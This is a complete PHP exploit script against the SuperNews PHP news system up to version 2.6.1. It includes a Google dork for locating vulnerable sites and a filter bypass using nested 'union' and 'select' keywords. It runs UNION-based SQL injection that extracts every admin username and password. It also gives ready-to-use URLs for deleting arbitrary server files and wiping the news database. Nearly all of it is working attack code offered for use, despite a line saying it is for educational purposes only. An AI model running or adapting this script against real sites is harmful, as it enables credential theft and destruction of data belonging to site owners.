<?php
# Exploit Title: Supernews <= 2.6.1 SQL Injection Exploit
# Google Dork: intext:"2003 - 2004 : SuperNews : Todos os direitos reservados"
# Date: 2012/
# Author: WhiteCollarGroup
# Software Link: http://phpbrasil.com/script/vT0FaOCySSH/supernews
# Version: 2.6.1
# Tested on: Debian GNU/Linux

/*
Exploit for educational purpose only.
Note sent to the developer Fernando Pontes by e-mail odnanrefsetnop@bol.com.br

SuperNews are a brazilian news system in PHP and MySQL.
Versions priors to 2.6 have a simple SQL Injection on view news.
The developer tried to fix the bug removing keywords like "union" and "select".
But, with a recursion, it's possible to bypass this filters. See:
seselectlect
After removing "select" word, will stay another "select" word. See more:
seSELECTlect

Another SQL Injection on the administration panel:
When deleting a post, you can inject SQL for delete all news on the database.

Another vulnerability allows to delete files, on the administration panel:
When deleting a post, a variable called "unlink" will talk to the system the new's image for delete.
But it's possible to delete others files, typing all the file path or using "../".

Usage:
php exploit.php http://target.com/supernews/

For more info about vulnerabilities:
php exploit.php moreinfo

Example:
$ php exploit.php http://target.com/news/

Supernews <= 2.6.1 SQL Injection Exploit
Coded by WhiteCollarGroup - www.wcgroup.host56.com
Use at your own risk.


[*] Trying to access server...
[*] Detecting version... :-o
[!] Version: >2.6.1 :-)
[!] Administration panel: http://target.com/news/admin/adm_noticias.php
[i] Type "exploit.php moreinfo" for get others vulnerabilities.
[*] Getting user & pass 8-]
User: user1
Pass: pass1

User: user2
Pass: pass2

Good luck! :-D

*/

error_reporting(E_ERROR);
set_time_limit(0);
@ini_set("default_socket_timeout", 30);

function hex($string){
    $hex=''; // PHP 'Dim' =]
    for ($i=0; $i < strlen($string); $i++){
        $hex .= dechex(ord($string[$i]));
    }
    return '0x'.$hex;
}
function str_replace_every_other($needle, $replace, $haystack, $count=null, $replace_first=true) {
    $count = 0;
    $offset = strpos($haystack, $needle);
    //If we don't replace the first, go ahead and skip it
    if (!$replace_first) {
        $offset += strlen($needle);
        $offset = strpos($haystack, $needle, $offset);
    }
    while ($offset !== false) {
        $haystack = substr_replace($haystack, $replace, $offset, strlen($needle));
        $count++;
        $offset += strlen($replace);
        $offset = strpos($haystack, $needle, $offset);
        if ($offset !== false) {
            $offset += strlen($needle);
            $offset = strpos($haystack, $needle, $offset);
        }
    }
    return $haystack;
}
function removeaddregex($str) {
  return str_replace_every_other('(.*)', '', $str, null, false);
}
function preg_quote_working($str) {
  $chars = explode(" ", "\ . + * ? [ ^ ] $ ( ) { } = ! < > | :");
  foreach($chars as $char) {
    $str = str_replace($char, "\\".$char, $str);
  }
  return $str;
}

echo "\nSupernews <= 2.6.1 SQL Injection Exploit";
echo "\nCoded by WhiteCollarGroup - www.wcgroup.host56.com\nUse at your own risk.\n\n";

if($argc!=2) {
  echo "Usage:
php $argv[0] url
Example:
php $argv[0] http://target.com/supernews
php $argv[0] https://target.com/supernews/";
  exit;
}

if($argv[1]=="moreinfo") {
  echo "\nMore vulnerabilities:
 - Deleting files
  You can delete files on the server, after login, using the URL:
   http://server.com/admin/adm_noticias.php?deleta=ID&unlink=FILE
  Replace \"ID\" with a valid post ID (will be deleted) and FILE with the file address on the server.

 - Deleting all news on the database:
  You can delete all news on the database with one request, only. Look:
   http://server.com/admin/adm_noticias.php?deleta=0%20or%201=1--+

  All vulnerabilities discovered by WCGroup.\n";
  exit;
}

$uri = $argv[1];
if(substr($uri, -1, 1)!="/") {
  $uri .= "/";
}
$url = $uri."noticias.php?noticia=".urlencode("-1")."+";
echo "\n[*] Trying to access server...";
$accessvr = @file_get_contents($url);
if(($accessvr==false) OR (preg_match("/(404|mysql_query)/", $accessvr))) {
  $url = $uri."index.php?noticia=".urlencode("-1")."+";
}

$token = substr(md5(chr(rand(48, 122))), 0, 10);

echo "\n[*] Detecting version... :-o";

$gettoken = strip_tags(file_get_contents($url.urlencode("union all select 1,2,3,4,".hex($token).",6,7-- ")));
if(preg_match("/".$token."/", $gettoken)) {
  echo "\n[!] Version: >2.6.1 :-)";
  $version = 1;
} else {
  $gettoken = strip_tags(file_get_contents($url.urlencode("uniunionon seleselectct 1,2,3,4,5,".hex($token).",7,8-- ")));
  if(preg_match("/".$token."/", $gettoken)) {
    echo "\n[!] Version =2.6.1 :-)";
    $version = 2;
  } else {
    echo "\n[-] Unknown version :-S";
    $version = 3;
  }
}
if($version!=3) {
  echo "\n[!] Administration panel: {$uri}admin/adm_noticias.php";
  echo "\n[i] Type \"$argv[0] moreinfo\" for get others vulnerabilities.";
  echo "\n[*] Getting user & pass 8-]";
}

if($version==1) {
  $i = 0;
  while(true) {
    $request = strip_tags(file_get_contents($url.urlencode("union all select 1,2,3,4,concat(".hex($token).",user,".hex($token).",pass,".hex($token)."),6,7 from supernews_login limit $i,1-- ")));
    preg_match_all("/$token(.*)$token(.*)$token/", $request, $get);
    if($get[1][0]!="") {
      $user = $get[1][0];
      $pass = $get[2][0];
      echo "\nUser: $user\nPass: $pass\n";
      $i++;
    } else {
      echo "\nGood luck! :-D";
      break;
    }
  }
}
elseif($version==2) {
  $i = 0;
  while(true) {
    $request = strip_tags(file_get_contents($url.urlencode("uniunionon seleselectct 1,2,3,4,5,concat(".hex($token).",user,".hex($token).",pass,".hex($token)."),7,8 from supernews_login limit $i,1-- ")));
    preg_match_all("/$token(.*)$token(.*)$token/", $request, $get);
    if($get[1][0]!="") {
      $user = $get[1][0];
      $pass = $get[2][0];
      echo "\nUser: $user\nPass: $pass\n";
      $i++;
    } else {
      echo "\nGood luck! :-D";
      break;
    }
  }
}
else {
  echo "\n\nThis site are using an unknown version of Supernews or another CMS.";
  echo "\nPlease note that only versions <= 2.6.1 of Supernews are vulnerable.";
  echo "\nWebservers with modules or firewalls like \"mod_security\" aren't vulnerables.";
  echo "\nIf you want, try to access manually:";
  echo "\nThe vulnerability are on view notice file (index.php or noticia.php), in variable \"noticia\", a simple SQL Injection.";
  echo "\nWe're sorry.";
}

echo "\n";